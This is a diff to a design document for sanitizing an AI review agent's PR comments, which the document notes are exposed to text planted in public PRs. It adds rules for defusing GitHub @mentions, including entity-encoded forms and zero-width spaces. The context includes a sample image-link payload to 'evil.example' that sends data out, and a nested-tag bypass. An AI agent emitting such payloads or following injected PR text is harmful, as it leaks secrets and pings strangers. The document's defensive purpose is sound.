@@ -35,7 +35,11 @@ An AI agent reads the PR, and on a public repo anyone can put text in a PR, incl
 - **Redacts secrets** such as GitHub tokens (`ghp_…`), Anthropic keys (`sk-ant-…`), AWS key ids, our own `nit_` tokens and private keys, in case the agent copied one from the environment or the code.
 - **Strips images and raw HTML.** An image is fetched when someone views the page, so `![x](https://evil.example/?data=…)` would send data to whoever owns that URL. Only the alt text is kept.
 - **Removes HTML comments**, because our own hidden marker (`<!-- nitpilot:v1 … -->`, see [dispatcher.md](dispatcher.md)) is one. Agent text must never be able to fake it.
-- **Defuses @mentions** of anyone outside the PR by wrapping them in backticks, so an agent can't ping strangers. Mentions inside code are left alone, since GitHub never pings from code.
+- **Defuses @mentions** of anyone outside the PR, so an agent can't ping strangers. Mentions inside code are left alone, since GitHub never pings from code. Three details matter, because GitHub is generous about what counts as a mention:
+  - GitHub pings any `@name` that isn't glued to a letter, digit or underscore, so `.@name`, `/@name` and `@@name` all ping. Emails (`a@b.com`) don't.
+  - GitHub decodes HTML entities first, so `&#64;name` (an encoded `@`) or `@&#110;ame` (an encoded letter) ping too. The sanitizer decodes the entities that spell a mention before it looks.
+  - A defused mention looks like `` `@​name` ``: backticks, plus an invisible zero-width space right after the `@`. The backticks alone aren't enough: in ``use `foo @name``, the stray backtick before `foo` pairs with the first one we add, which leaves `@name` outside code again. GitHub needs a name character straight after the `@`, so the invisible space keeps it quiet whatever the backticks do.
+- **Cuts long text before defusing mentions.** Cutting afterwards could turn an allowed `@maya` into `@ma` (someone else), or cut a code span open so the `@name` inside it is plain text again.
 
 The removals run **again and again until nothing changes**. One pass isn't enough: in `<<b>img src=…>`, removing the inner `<b>` leaves a brand-new `<img src=…>`.
 
